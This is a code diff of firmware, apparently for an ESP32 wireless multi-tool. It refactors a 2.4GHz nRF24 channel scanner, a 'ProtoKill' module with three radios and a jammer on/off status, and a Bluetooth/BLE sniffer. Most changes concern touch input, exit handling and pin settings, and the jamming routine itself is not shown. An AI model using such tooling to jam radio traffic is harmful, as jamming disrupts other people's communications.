@@ -1686,7 +1710,6 @@ void runUI() {
       switch (activeIcon) {
         case 0: calibrateBackgroundNoise(); break;
         case 1: scan(); break;
-        case 2: feature_exit_requested = true; break;
       }
     } else if (animationState == 2) {
       animationState = 0;
@@ -1696,22 +1719,27 @@ void runUI() {
   }
 
   static unsigned long lastTouchCheck = 0;
-  const unsigned long touchCheckInterval = 50;  
+  const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
             if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
+
+              if (i == 2) {
+                feature_exit_requested = true;
+
+                scanning = false;
+              } else {
+
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
             }
             break;
           }
@@ -1724,19 +1752,36 @@ void runUI() {
 
 void scanChannels() {
   disable();
-  for (int j = 0; j < 100 && scanning; j++) {
-    if (isSelectButtonPressed()) {
-      scanning = false;
-      Print("Scan interrupted by user", TFT_YELLOW, true);
-      return;
-    }
+  static uint32_t lastUI = 0;
+  for (int j = 0; j < (int)SCAN_SWEEPS && scanning; j++) {
     for (int i = 0; i < CHANNELS && scanning; i++) {
-      setRegister(_NRF24_RF_CH, (128 * i) / CHANNELS);
-      setRX();
-      delayMicroseconds(50);
+
+      if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
+        scanning = false;
+        Print("Scan interrupted by user", TFT_YELLOW, true);
+        return;
+      }
+      if (feature_exit_requested) {
+        scanning = false;
+        return;
+      }
+
+      setRegister(_NRF24_RF_CH, (uint8_t)i);
+      enable();
+      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
       disable();
-      if (getRegister(_NRF24_RPD) > 0) channel[i]++;
-      runUI();
+      if (carrierDetected()) channel[i]++;
+
+      uint32_t now = millis();
+      if (now - lastUI >= UI_THROTTLE_MS) {
+        runUI();
+        lastUI = now;
+        delay(0);
+        if (feature_exit_requested) {
+          scanning = false;
+          return;
+        }
+      }
     }
   }
 }
@@ -1746,15 +1791,22 @@ void outputChannels() {
   for (int i = 0; i < CHANNELS && scanning; i++) {
     if (channel[i] > norm) norm = channel[i];
   }
+  static uint32_t lastUI = 0;
   for (int i = 0; i < CHANNELS && scanning; i++) {
-    if (isSelectButtonPressed()) {
+    if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
       scanning = false;
       Print("Output interrupted by user", TFT_YELLOW, true);
       return;
     }
     int strength = (norm != 0) ? (channel[i] * 10) / norm : 0;
+    (void)strength;
     channel[i] = 0;
-    runUI();
+    uint32_t now = millis();
+    if (now - lastUI >= UI_THROTTLE_MS) {
+      runUI();
+      lastUI = now;
+      delay(0);
+    }
   }
 }
 
@@ -1766,25 +1818,29 @@ void display() {
 
   memset(values, 0, sizeof(values));
 
-  int scanCycles = 50;
-  while (scanCycles-- && scanning) {  
-    if (isSelectButtonPressed()) {    
+  int scanCycles = (int)DISPLAY_SWEEPS;
+  while (scanCycles-- && scanning) {
+    if (isSelectButtonPressed()) {
       scanning = false;
       Print("Display interrupted by user", TFT_YELLOW, true);
       return;
     }
-    for (int i = 0; i < N && scanning; ++i) {  
+    for (int i = 0; i < N && scanning; ++i) {
       setChannel(i);
       enable();
-      delayMicroseconds(128);
+
+      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
       disable();
       if (carrierDetected()) {
         values[i]++;
       }
     }
+
+    runUI();
+    delay(0);
   }
 
-  if (scanning) {  
+  if (scanning) {
     tft.fillRect(0, 190, 240, 200, TFT_BLACK);
 
 #define CHANNELS 128
@@ -1833,11 +1889,10 @@ void display() {
 
 void scannerSetup() {
 
-  tft.setRotation(0);
   tft.fillScreen(TFT_BLACK);
 
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
   uiDrawn = false;
   display();
 
@@ -1848,19 +1903,19 @@ void scannerSetup() {
   Print(" ", TFT_GREEN, false);
   Print("[*] 2.4GHz Scanner Initialized...", TFT_GREEN, false);
 
-  SPI.begin(18, 19, 23, 17);
+  SPI.begin(13, 11, 12, 4);
   SPI.setDataMode(SPI_MODE0);
   SPI.setFrequency(10000000);
   SPI.setBitOrder(MSBFIRST);
 
   pinMode(CE, OUTPUT);
   pinMode(CSN, OUTPUT);
-  pinMode(BUTTON, INPUT_PULLUP);
-
-  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
 
   disable();
   powerUp();
+
+  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x03);
+  delayMicroseconds(130);
   setRegister(_NRF24_EN_AA, 0x0);
   setRegister(_NRF24_RF_SETUP, 0x0F);
 
@@ -1870,6 +1925,17 @@ void scannerSetup() {
 void scannerLoop() {
   scanning = true;
   while (scanning) {
+
+    if (feature_active && isButtonPressed(BTN_SELECT)) {
+      feature_exit_requested = true;
+      scanning = false;
+      break;
+    }
+    if (feature_exit_requested) {
+      scanning = false;
+      break;
+    }
+
     if (isSelectButtonPressed()) {
       scanning = false;
       Print("Scanner stopped by user", TFT_YELLOW, true);
@@ -1879,33 +1945,12 @@ void scannerLoop() {
     scanChannels();
     outputChannels();
     display();
-    delay(5);  
+    delay(5);
     }
   }
 }
 
-
-/*
- * 
- * ProtoKill
- * 
- * 
-*/
-
 namespace ProtoKill {
-
-#define CE_PIN_1  16
-#define CSN_PIN_1 17
-#define CE_PIN_2  26
-#define CSN_PIN_2 27
-#define CE_PIN_3  4
-#define CSN_PIN_3 5
-
-#define BTN_UP       6
-#define BTN_DOWN     3
-#define BTN_LEFT     4
-#define BTN_RIGHT    5
-#define BTN_SELECT   7
 
 RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
 RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
@@ -1945,9 +1990,8 @@ volatile bool jammerToggleRequested = false;
 unsigned long lastButtonPressTime = 0;
 const unsigned long debounceDelay = 500;
 
-
 void scroll() {
-  for (int i = 3; i < MAX_LINES - 1; i++) {
+  for (int i = 0; i < MAX_LINES - 1; i++) {
     Buffer[i] = Buffer[i + 1];
     Buffercolor[i] = Buffercolor[i + 1];
   }
@@ -1969,8 +2013,8 @@ void Print(String text, uint16_t color, bool extraSpace = false) {
     Index++;
   }
 
-  for (int i = 3; i < Index; i++) {
-    int yPos = i * LINE_HEIGHT + 15;
+  for (int i = 0; i < Index; i++) {
+    int yPos = (i * LINE_HEIGHT) + 48;
 
     tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
 
@@ -2088,25 +2132,6 @@ void updateTFT() {
   tft.drawRoundRect(0, 19, 240, 16, 4, LIGHT_GRAY);
   tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
-  /*
-  tft.setCursor(5, 7);
-  tft.printf("Mode: %s",
-             (currentMode == BLE_MODULE)           ? "BLE" :
-             (currentMode == Bluetooth_MODULE)     ? "Bluetooth" :
-             (currentMode == WiFi_MODULE)          ? "WIFI" :
-             (currentMode == USB_WIRELESS_MODULE)  ? "USB" :
-             (currentMode == VIDEO_TX_MODULE)      ? "Video" :
-             (currentMode == RC_MODULE)            ? "RC" :
-             (currentMode == ZIGBEE_MODULE)        ? "ZIGBEE" :
-             (currentMode == NRF24_MODULE)         ? "NRF24" : "Unknown"
-            );
-
-  tft.setCursor(100, 7);
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.print("Jammer: ");
-  tft.setTextColor(jammerActive ? TFT_RED : TFT_GREEN);
-  tft.printf(jammerActive ? "ON" : "OFF");
-  */
 }
 
 void printModeChange(OperationMode mode) {
@@ -2128,7 +2153,7 @@ void printModeChange(OperationMode mode) {
 void printJammerStatus(bool active) {
   String jammerText = "[!] Jammer ";
   jammerText += active ? "Activated" : "Deactivated";
-  Print(jammerText, TFT_RED, false);
+  Print(jammerText, TFT_GREEN, false);
 }
 
 void checkModeChange() {
@@ -2159,25 +2184,15 @@ void checkModeChange() {
   }
 }
 
-
 void prokillSetup() {
 
   tft.fillScreen(TFT_BLACK);
-  tft.setRotation(0);
-  
+
   float currentBatteryVoltage = readBatteryVoltage();
-  drawStatusBar(currentBatteryVoltage, false);
+  drawStatusBar(currentBatteryVoltage, true);
   updateTFT();
 
-  Print("===== System Diagnostics =====", TFT_CYAN, false);
-  Print("Initializing TFT display...", TFT_WHITE, false);
-
   initializeRadios();
-
-  Print("[*] Disabling Bluetooth & WiFi...", TFT_WHITE, false);
-  Print("[*] Bluetooth & WiFi disabled.", TFT_WHITE, false);
-
-  Print("[*] Initializing PCF8574...", TFT_WHITE, false);
 
   pcf.pinMode(BTN_UP, INPUT_PULLUP);
   pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
@@ -2189,6 +2204,11 @@ void prokillSetup() {
 }
 
 void prokillLoop() {
+
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
 
   checkModeChange();
 
@@ -2253,14 +2273,6 @@ void prokillLoop() {
   }
 }
 
-
-/*
- * 
- * BLE Sniffer
- * 
- * 
-*/
-
 namespace BleSniffer {
 
 #define SCREEN_WIDTH  240
@@ -2276,8 +2288,8 @@ static int iconX[ICON_NUM] = {170, 210, 10};
 static const unsigned char* icons[ICON_NUM] = {
   bitmap_icon_undo,
   bitmap_icon_eye2,
-  bitmap_icon_go_back // Added back icon
-};  
+  bitmap_icon_go_back
+};
 
 #define HEADER_HEIGHT 20
 #define STATUS_DOT_SIZE 8
@@ -2358,14 +2370,14 @@ private:
     uiDrawn = false;
 
     float currentBatteryVoltage = readBatteryVoltage();
-    drawStatusBar(currentBatteryVoltage, false);
+    drawStatusBar(currentBatteryVoltage, true);
     runUI();
-  
+
     setupTouchscreen();
     tft.fillRect(0, 37, 240, 320, TFT_BLACK);
     tft.setTextSize(1);
     updateHeader();
-    //addLine("Bluetooth Sniffer Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
+
   }
 
   void updateHeader() {
@@ -2413,7 +2425,7 @@ private:
     if (deviceCount == 0 && lineNumber == 1) {
       tft.setTextColor(GREEN, TFT_BLACK);
       tft.setCursor(5, Y_OFFSET + HEADER_HEIGHT + 10);
-      //tft.print("No Devices Detected");
+
     }
   }
 
@@ -2646,10 +2658,10 @@ void runUI() {
             refreshDisplay();
             addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
           break;
-        case 1: 
+        case 1:
            filterSuspicious();
           break;
-        case 2: // Back icon action (exit to submenu)
+        case 2:
            feature_exit_requested = true;
           break;
       }
@@ -2664,11 +2676,8 @@ void runUI() {
   const unsigned long touchCheckInterval = 50;
 
   if (millis() - lastTouchCheck >= touchCheckInterval) {
-    if (ts.touched() && feature_active) {
-      TS_Point p = ts.getPoint();
-      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
-      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);
-
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
       if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
         for (int i = 0; i < ICON_NUM; i++) {
           if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
@@ -2694,35 +2703,15 @@ public:
     float currentBatteryVoltage = readBatteryVoltage();
     drawStatusBar(currentBatteryVoltage, false);
     runUI();
-  
+
     setupTouchscreen();
-    
+
     initDisplay();
-    BLEDevice::init("");
+
     pBLEScan = BLEDevice::getScan();
     pBLEScan->setAdvertisedDeviceCallbacks(new AdvertisedDeviceCallbacks(*this));
     pBLEScan->setActiveScan(true);
-    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
-    if (esp_bt_controller_init(&bt_cfg) != ESP_OK) {
-      addLine("Failed to init BT controller", RED, true, MessageType::ALERT);
-      return;
-    }
-    if (esp_bt_controller_enable(ESP_BT_MODE_BTDM) != ESP_OK) {
-      addLine("Failed to enable BT controller", RED, true, MessageType::ALERT);
-      return;
-    }
-    if (esp_bluedroid_init() != ESP_OK) {
-      addLine("Failed to init Bluedroid", RED, true, MessageType::ALERT);
-      return;
-    }
-    if (esp_bluedroid_enable() != ESP_OK) {
-      addLine("Failed to enable Bluedroid", RED, true, MessageType::ALERT);
-      return;
-    }
-    if (esp_bt_gap_register_callback(btCallback) != ESP_OK) {
-      addLine("Failed to register BT callback", RED, true, MessageType::ALERT);
-      return;
-    }
+
     addLine("Bluetooth Sniffer Ready", DARK_GRAY, true, MessageType::STATUS);
     startBLEScan();
   }
@@ -2731,8 +2720,8 @@ public:
     unsigned long now = millis();
     tft.drawLine(0, 19, 240, 19, TFT_WHITE);
 
-    updateStatusBar();
     runUI();
+    updateStatusBar();
     cleanupDevices(now);
     if (scanning && now - lastScanTime >= SCAN_INTERVAL) {
       if (isBLEScanActive) {
@@ -2740,7 +2729,7 @@ public:
         startBTScan();
         isBLEScanActive = false;
       } else {
-        esp_bt_gap_cancel_discovery();
+
         startBLEScan();
         isBLEScanActive = true;
       }
@@ -2777,9 +2766,9 @@ public:
     BluetoothSniffer& sniffer;
   public:
     AdvertisedDeviceCallbacks(BluetoothSniffer& s) : sniffer(s) {}
-    void onResult(BLEAdvertisedDevice advertisedDevice) override {
-      String mac = advertisedDevice.getAddress().toString().c_str();
-      int rssi = advertisedDevice.getRSSI();
+    void onResult(BLEAdvertisedDevice* advertisedDevice) override {
+      String mac = advertisedDevice->getAddress().toString().c_str();
+      int rssi = advertisedDevice->getRSSI();
       unsigned long timestamp = millis();
       int idx = -1;
       for (int i = 0; i < sniffer.deviceCount; i++) {
@@ -2797,7 +2786,7 @@ public:
         }
         sniffer.checkSuspiciousActivity(idx, timestamp);
       } else {
-        sniffer.processNewDevice(&advertisedDevice, nullptr, timestamp, true);
+        sniffer.processNewDevice(advertisedDevice, nullptr, timestamp, true);
       }
     }
   };
@@ -2837,13 +2826,20 @@ public:
 
   void startBTScan() {
     newDevicesThisScan = 0;
-    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, Config::btScanDuration, 0);
+
     addLine("Classic BT Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
     updateHeader();
   }
 
   void setSnifferInstance() {
     snifferInstance = this;
+  }
+
+  void stop() {
+    scanning = false;
+    if (pBLEScan) {
+      pBLEScan->stop();
+    }
   }
 };
 
@@ -2857,6 +2853,17 @@ void blesnifferSetup() {
 }
 
 void blesnifferLoop() {
+
+  if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
   sniffer.loop();
-  } 
+  }
+
+void exit() {
+
+  sniffer.stop();
+}
 }
